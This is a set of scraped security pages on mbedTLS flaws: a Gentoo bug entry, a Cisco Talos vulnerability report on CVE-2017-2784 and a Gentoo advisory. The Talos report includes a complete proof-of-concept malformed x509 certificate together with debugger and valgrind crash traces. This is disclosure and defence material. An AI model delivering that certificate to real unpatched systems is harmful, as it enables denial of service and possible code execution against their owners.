=== Content from bugs.gentoo.org_c29ad5c7_20250126_092042.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 562608
<net-libs/mbedtls-2.1.2: crash or remote code execution on clients using session tickets or SNI (CVE-2015-5291)
Last modified: 2017-06-20 17:45:52 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=562608&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=562608&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 562608**](show_bug.cgi?id=562608)
- <net-libs/mbedtls-2.1.2: crash or remote code execution on clients using session tickets or SNI (CVE-2015-5291)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
<net-libs/mbedtls-2.1.2: crash or remote code execution on clients using sess...

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Normal major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | [https://tls.mbed.org/tech-updates/sec...](https://tls.mbed.org/tech-updates/security-advisories/mbedtls-security-advisory-2015-01) | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | B1 [glsa cve] | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [CVE-2015-5291](show_bug.cgi?id=620500 "RESOLVED FIXED - [TRACKER] polarssl: mbedtls: crash or remote code execution on clients using session tickets or SNI (CVE-2015-5291)") | |  | Show dependency [tree](showdependencytree.cgi?id=562608&hide_resolved=1) | |  | | Reported: | 2015-10-08 21:45 UTC by Julian Ospald | | --- | --- | | Modified: | 2017-06-20 17:45 UTC ([History](show_activity.cgi?id=562608)) | | CC List: | 2 users (show)  blueness tommy | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=562608&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=562608&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Julian Ospald    2015-10-08 21:45:43 UTC  ``` Denial of service and possible remote code execution, see $URL for full description. Severity rated high by upstream. ```  [Comment 1](#c1)  Julian Ospald    2015-10-08 21:49:44 UTC  ``` mbedtls bumped to 2.1.2 and old versions cleaned up: <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=769245b868ad148eb4f44f463c8190641c311781> <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=a8e6d5bf813b88ed5cc43bbfb5d2aaa72cfe4cc5> ```  [Comment 2](#c2)  Yury German   Gentoo Infrastructure gentoo-dev  2017-04-17 22:20:45 UTC  ``` Is PolarSSL done? I do not see anything higher then 1.3.9 ```  [Comment 3](#c3)  Yury German   Gentoo Infrastructure gentoo-dev  2017-04-29 16:07:18 UTC  ``` Ping on the question above? ```  [Comment 4](#c4)  Thomas Sachau   gentoo-dev  2017-05-13 13:53:58 UTC  ``` Sorry, i have been and am still pretty busy, but for now checked the remaining packages depending on polarssl. I have opened bugs for them, [bug 618354](show_bug.cgi?id=618354 "RESOLVED FIXED - [TRACKER] Track needed masks/removals for dropping net-libs/polarssl") tracks them. ```  [Comment 5](#c5)  Thomas Deutschmann (RETIRED)   gentoo-dev  2017-06-03 12:31:02 UTC  ``` I split out net-libs/polarssl into [bug 620502](show_bug.cgi?id=620502 "RESOLVED FIXED - <net-libs/polarssl-1.3.14: crash or remote code execution on clients using session tickets or SNI (CVE-2015-5291)"). ```  [Comment 6](#c6)  GLSAMaker/CVETool Bot   gentoo-dev  2017-06-20 17:45:52 UTC  ``` This issue was resolved and addressed in  GLSA 201706-18 at <https://security.gentoo.org/glsa/201706-18> by GLSA coordinator Kristian Fiskerstrand (K_F). ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=562608)
* - [XML](show_bug.cgi?ctype=xml&id=562608)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=562608)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=562608&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=562608&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=562608&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from www.talosintelligence.com_235aa9bf_20250125_142024.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2017-0274

## ARM Mbedtls x509 ECDSA invalid public key Remote Code Execution Vulnerability

##### April 19, 2017

##### CVE Number

CVE-2017-2784

### Summary

An exploitable free of a stack pointer vulnerability exists in the x509 certificate parsing code of ARM mbedTLS 2.4.0. A specially crafted x509 certificate, when parsed by mbedTLS library, can cause an invalid free of a stack pointer leading to a potential remote code execution. In order to exploit this vulnerability, an attacker can act as either a client or a server on a network to deliver malicious x509 certificates to vulnerable applications.

### Tested Versions

ARM mbedTLS 2.4.0.

### Product URLs

<https://tls.mbed.org/>

### CVSSv3 Score

8.1 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A

### CWE

CWE-590: Free of Memory not on the Heap

### Details

mbedTLS, previously known as PolarSSL is an SSL and TLS implementation aimed at embedded devices and as such has few dependencies and small footprint. It is especially popular as a way of providing transport layer security to embedded web servers such as GoAhead, for example.

The vulnerability exists in the part of the code responsible for handling elliptic curve cryptographic keys. It can be triggered by supplying a specially crafted x509 certificate to the target which performs a series of checks on the certificate and supplied public key. In the provided proof-of-concept x509 certificate a curve of type `secp224k1` is specified:

```
openssl x509 -inform DER -text -in poc.der
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 11350574552211845977 (0x9d85576ad52cf359)
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Validity
            Not Before: Jan 12 21:21:28 2017 GMT
            Not After : Jan 12 21:21:28 2018 GMT
        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
            Unable to load Public Key
    Signature Algorithm: ecdsa-with-SHA256
         30:3d:02:1d:00:d1:46:8a:7d:f8:d1:03:a7:a9:90:9a:2d:09:
         2f:e9:15:b5:5e:3a:14:ac:23:20:41:6e:0c:d0:c3:02:1c:10:
         1c:89:d4:0d:a3:04:0b:53:33:e4:fb:75:44:1d:a4:a3:0b:f9:
         d9:45:47:ff:99:d2:6f:ae:49
-----BEGIN CERTIFICATE-----
MIIBZzCCARUCCQCdhVdq1SzzWTAKBggqhkjOPQQDAjBFMQswCQYDVQQGEwJBVTET
MBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQ
dHkgTHRkMB4XDTE3MDExMjIxMjEyOFoXDTE4MDExMjIxMjEyOFowRTELMAkGA1UE
BhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdp
ZGdpdHMgUHR5IEx0ZDBOMBAGByqGSM49AgEGBSuBBAAgAzoABAAAAADiAAAAAAAA
uzoT1DsyMzc4OTUyHwYDVR0QAQH/BAgwBgEB/wIBCjAiBgNVHQ4EGwRjb8DAMAoG
CCqGSM49BAMCA0AAMD0CHQDRRop9+NEDp6mQmi0JL+kVtV46FKwjIEFuDNDDAhwQ
HInUDaMEC1Mz5Pt1RB2kowv52UVH/5nSb65J
-----END CERTIFICATE-----

```

Notice that `openssl x509` tool fails to parse the public key properly. While parsing the certificate, and public key specifically, mbedTLS library will identify the curve in question as `secp224k1` while validating the public key and will invoke a numer of elliptic curve arithmetic in order to verify the key, as can be seen from the context of the crashing application:

```
#0  0x00007ffff7a43428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#1  0x00007ffff7a4502a in __GI_abort () at abort.c:89
#2  0x00007ffff7a857ea in __libc_message (do_abort=do_abort@entry=2, fmt=fmt@entry=0x7ffff7b9e2e0 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#3  0x00007ffff7a8de0a in malloc_printerr (ar_ptr=<optimized out>, ptr=<optimized out>, str=0x7ffff7b9e3f0 "double free or corruption (out)", action=3) at malloc.c:5004
#4  _int_free (av=<optimized out>, p=<optimized out>, have_lock=0) at malloc.c:3865
#5  0x00007ffff7a9198c in __GI___libc_free (mem=<optimized out>) at malloc.c:2966
#6  0x0000000000429785 in mbedtls_mpi_grow (X=0x7fffffffcc30, nblimbs=4) at bignum.c:130
#7  0x000000000042c08a in mbedtls_mpi_mul_mpi (X=0x7fffffffcc30, A=0x7fffffffcba0, B=0x7fffffffcc50) at bignum.c:1187
#8  0x00000000004422c7 in ecp_mod_koblitz (N=0x7fffffffcd40, Rp=0x6882e0 <Rp.3115>, p_limbs=4, adjust=1, shift=32, mask=4294967295) at ecp_curves.c:1247
#9  0x0000000000442546 in ecp_mod_p224k1 (N=0x7fffffffcd40) at ecp_curves.c:1304
#10 0x0000000000437534 in ecp_modp (N=0x7fffffffcd40, grp=0x68b6e0) at ecp.c:677
#11 0x000000000043baf1 in ecp_check_pubkey_sw (grp=0x68b6e0, pt=0x68b7f0) at ecp.c:1660
#12 0x000000000043bfef in mbedtls_ecp_check_pubkey (grp=0x68b6e0, pt=0x68b7f0) at ecp.c:1774
#13 0x000000000044b57f in pk_get_ecpubkey (p=0x7fffffffce78, end=0x68b53d "0\n\006\b*\206H\316=\004\003\002\003@", key=0x68b6e0) at pkparse.c:489
#14 0x000000000044b957 in mbedtls_pk_parse_subpubkey (p=0x7fffffffce78, end=0x68b53d "0\n\006\b*\206H\316=\004\003\002\003@", pk=0x7fffffffd568) at pkparse.c:623
#15 0x00000000004233c8 in x509_crt_parse_der_core (crt=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=363) at x509_crt.c:821
#16 0x000000000042378a in mbedtls_x509_crt_parse_der (chain=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=363) at x509_crt.c:952
#17 0x0000000000423879 in mbedtls_x509_crt_parse (chain=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=363) at x509_crt.c:995
#18 0x0000000000423a1f in mbedtls_x509_crt_parse_file (chain=0x7fffffffd420, path=0x7fffffffe85f "/ramdisk/poc.der") at x509_crt.c:1094
#19 0x0000000000401d66 in main (argc=3, argv=0x7fffffffe5e8) at x509/cert_app.c:299

```

In the above output, the application is crashing due to invalid call to free inside `mbedtls_mpi_grow` function:

```
int mbedtls_mpi_grow( mbedtls_mpi *X, size_t nblimbs )
{
    mbedtls_mpi_uint *p;

...
    if( X->n < nblimbs )
    {
        if( ( p = (mbedtls_mpi_uint*)mbedtls_calloc( nblimbs, ciL ) ) == NULL )
            return( MBEDTLS_ERR_MPI_ALLOC_FAILED );

        if( X->p != NULL )
        {
            memcpy( p, X->p, X->n * ciL );
            mbedtls_mpi_zeroize( X->p, X->n );
            mbedtls_free( X->p );                                [1]
        }

....
}

```

At [1] a wrapper to libc `free` is called with `X->p` as parameter. Going backwards through the callstack and code, it can be concluded that final values of `X` and `X->p` are actually initialized in `ecp_mod_koblitz` function:

```
static inline int ecp_mod_koblitz( mbedtls_mpi *N, mbedtls_mpi_uint *Rp, size_t p_limbs,
                                   size_t adjust, size_t shift, mbedtls_mpi_uint mask )
{
    int ret;
    size_t i;
    mbedtls_mpi M, R;
    mbedtls_mpi_uint Mp[P_KOBLITZ_MAX + P_KOBLITZ_R];                                [1]
...
    /* Common setup for M */
    M.s = 1;
    M.p = Mp;                                                                        [2]

    /* M = A1 */
    M.n = N->n - ( p_limbs - adjust );
...
    MBEDTLS_MPI_CHK( mbedtls_mpi_mul_mpi( &M, &M, &R ) );                                [3]

...

```

At [1], we can observe variable `Mp` being allocated on the stack. It’s assigned to `M.p` at [2] and at [3], a call to `mbedtls_mpi_mul_mpi` is made, which eventually leads to invalid free. This can also be confirmed in the debugger:

```
Breakpoint 1, mbedtls_mpi_grow (X=0x7fffffffcc30, nblimbs=0x5) at bignum.c:118
118         if( nblimbs > MBEDTLS_MPI_MAX_LIMBS )
gdb-peda$ p X->p
$7 = (mbedtls_mpi_uint *) 0x7fffffffcc70
gdb-peda$ vmmap X->p
Warning: not found or cannot access procfs
gdb-peda$ vmmap 0x7fffffffcc70
Start              End                Perm      Name
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
gdb-peda$ bt
#0  mbedtls_mpi_grow (X=0x7fffffffcc30, nblimbs=0x5) at bignum.c:118
#1  0x000000000042c08a in mbedtls_mpi_mul_mpi (X=0x7fffffffcc30, A=0x7fffffffcba0, B=0x7fffffffcc50) at bignum.c:1187
#2  0x00000000004422c7 in ecp_mod_koblitz (N=0x7fffffffcd20, Rp=0x6882e0 <Rp.3115>, p_limbs=0x4, adjust=0x1, shift=0x20, mask=0xffffffff) at ecp_curves.c:1247
#3  0x0000000000442546 in ecp_mod_p224k1 (N=0x7fffffffcd20) at ecp_curves.c:1304
#4  0x0000000000437534 in ecp_modp (N=0x7fffffffcd20, grp=0x68b6e0) at ecp.c:677
#5  0x000000000043ba9b in ecp_check_pubkey_sw (grp=0x68b6e0, pt=0x68b7f0) at ecp.c:1659
#6  0x000000000043bfef in mbedtls_ecp_check_pubkey (grp=0x68b6e0, pt=0x68b7f0) at ecp.c:1774
#7  0x000000000044b57f in pk_get_ecpubkey (p=0x7fffffffce78, end=0x68b53d "0\n\006\b*\206H\316=\004\003\002\003@", key=0x68b6e0) at pkparse.c:489
#8  0x000000000044b957 in mbedtls_pk_parse_subpubkey (p=0x7fffffffce78, end=0x68b53d "0\n\006\b*\206H\316=\004\003\002\003@", pk=0x7fffffffd568) at pkparse.c:623
#9  0x00000000004233c8 in x509_crt_parse_der_core (crt=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=0x16b) at x509_crt.c:821
#10 0x000000000042378a in mbedtls_x509_crt_parse_der (chain=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=0x16b) at x509_crt.c:952
#11 0x0000000000423879 in mbedtls_x509_crt_parse (chain=0x7fffffffd420, buf=0x68c660 "0\202\001g0\202\001\025\002\t", buflen=0x16b) at x509_crt.c:995
#12 0x0000000000423a1f in mbedtls_x509_crt_parse_file (chain=0x7fffffffd420, path=0x7fffffffe85f "/ramdisk/poc.der") at x509_crt.c:1094
#13 0x0000000000401d66 in main (argc=0x3, argv=0x7fffffffe5e8) at x509/cert_app.c:299
#14 0x00007ffff7a2e830 in __libc_start_main (main=0x401722 <main>, argc=0x3, argv=0x7fffffffe5e8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,
    stack_end=0x7fffffffe5d8) at ../csu/libc-start.c:291
#15 0x0000000000401519 in _start ()
gdb-peda$

```

Mitigating factor of this vulnerability is the fact that the area of memory pointed to by pointer being freed is zeroed-out just before the free, which does complicate exploitation, but since the library is designed and intended for embedded platforms which might not have modern heap exploitation mitigations in place, we believe it can result in remote code execution in certain environments.

The vulnerability can be triggered with the supplied PoC file by opening it in `cert_app` sample application provided with the library.

### Crash Information

Valgrind output:

```
valgrind ./cert_app   mode=file filename=/ramdisk/poc.der
==28084== Memcheck, a memory error detector
==28084== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.
==28084== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info
==28084== Command: ./cert_app mode=file filename=/ramdisk/poc.der
==28084==
  . Loading the CA root certificate ... ok (0 skipped)

  . Loading the certificate(s) ...==28084== Invalid free() / delete / delete[] / realloc()
==28084==    at 0x4C2EDEB: free (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==28084==    by 0x429784: mbedtls_mpi_grow (bignum.c:130)
==28084==    by 0x42C089: mbedtls_mpi_mul_mpi (bignum.c:1187)
==28084==    by 0x4422C6: ecp_mod_koblitz (ecp_curves.c:1247)
==28084==    by 0x442545: ecp_mod_p224k1 (ecp_curves.c:1304)
==28084==    by 0x437533: ecp_modp (ecp.c:677)
==28084==    by 0x43BAF0: ecp_check_pubkey_sw (ecp.c:1660)
==28084==    by 0x43BFEE: mbedtls_ecp_check_pubkey (ecp.c:1774)
==28084==    by 0x44B57E: pk_get_ecpubkey (pkparse.c:489)
==28084==    by 0x44B956: mbedtls_pk_parse_subpubkey (pkparse.c:623)
==28084==    by 0x4233C7: x509_crt_parse_der_core (x509_crt.c:821)
==28084==    by 0x423789: mbedtls_x509_crt_parse_der (x509_crt.c:952)
==28084==  Address 0xffeffebe0 is on thread 1's stack
==28084==  in frame #3, created by ecp_mod_koblitz (ecp_curves.c:1212)
==28084==
 failed
  !  mbedtls_x509_crt_parse_file returned -19584

==28084==
==28084== HEAP SUMMARY:
==28084==     in use at exit: 32 bytes in 1 blocks
==28084==   total heap usage: 25 allocs, 25 frees, 7,447 bytes allocated
==28084==
==28084== LEAK SUMMARY:
==28084==    definitely lost: 32 bytes in 1 blocks
==28084==    indirectly lost: 0 bytes in 0 blocks
==28084==      possibly lost: 0 bytes in 0 blocks
==28084==    still reachable: 0 bytes in 0 blocks
==28084==         suppressed: 0 bytes in 0 blocks
==28084== Rerun with --leak-check=full to see details of leaked memory
==28084==
==28084== For counts of detected and suppressed errors, rerun with: -v
==28084== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)

```
### Timeline

2017-01-25 - Vendor Disclosure

2017-04-19 - Public Release

##### Credit

Discovered by Aleksandar Nikolic of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2017-0310](/vulnerability_reports/TALOS-2017-0310) [Previous Report

TALOS-2017-0302](/vulnerability_reports/TALOS-2017-0302)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from security.gentoo.org_6699c1bd_20250125_142025.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# mbed TLS: Multiple vulnerabilities — GLSA **201706-18**

Multiple vulnerabilities have been found in mbed TLS, the worst of
which could lead to the remote execution of arbitrary code.

### Affected packages

| Package | **net-libs/mbedtls** on all architectures |
| --- | --- |
| Affected versions | < **2.4.2** |
| Unaffected versions | >= **2.4.2** |

### Background

mbed TLS (previously PolarSSL) is an “easy to understand, use,
integrate and expand” implementation of the TLS and SSL protocols and
the respective cryptographic algorithms and support code required.

### Description

Multiple vulnerabilities have been discovered in mbed TLS. Please review
the CVE identifiers referenced below for details.

### Impact

A remote attacker could possibly execute arbitrary code with the
privileges of the process, or cause a Denial of Service condition.

### Workaround

There is no known workaround at this time.

### Resolution

All mbed TLS users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-libs/mbedtls-2.4.2"

```
### References

* [CVE-2015-5291](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-5291)
* [CVE-2015-7575](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-7575)
* [CVE-2017-2784](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-2784)

**Release date**

June 20, 2017

**Latest revision**

June 20, 2017: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [562608](https://bugs.gentoo.org/show_bug.cgi?id=562608)
* [571102](https://bugs.gentoo.org/show_bug.cgi?id=571102)
* [618824](https://bugs.gentoo.org/show_bug.cgi?id=618824)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


